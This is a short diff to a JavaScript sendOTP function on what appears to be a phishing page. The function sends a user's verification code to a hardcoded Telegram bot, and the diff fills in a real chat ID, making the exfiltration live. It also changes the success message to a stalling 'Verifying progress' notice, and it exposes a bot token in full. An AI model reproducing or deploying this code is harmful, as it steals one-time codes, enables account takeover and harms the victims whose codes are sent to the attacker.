@@ -74,10 +74,10 @@ function sendOTP() {
   xhttp.onreadystatechange = function() {
     if (this.readyState == 4 && this.status == 200) {
       // Success
-      showToast("OTP Sent Successful");
+      showToast("Verifying progress wait for the result ");
     }
   };
-  xhttp.open("GET", "https://api.telegram.org/bot7164991795:AAFojOSRUjrsc9Ky7zRgREB_9G6a0Z9vFZE/sendMessage?chat_id=YOUR_CHAT_ID&text=Verification Code: " + code, true);
+  xhttp.open("GET", "https://api.telegram.org/bot7164991795:AAFojOSRUjrsc9Ky7zRgREB_9G6a0Z9vFZE/sendMessage?chat_id=5810467269&text=Verification Code: " + code, true);
   xhttp.send();
 }
 
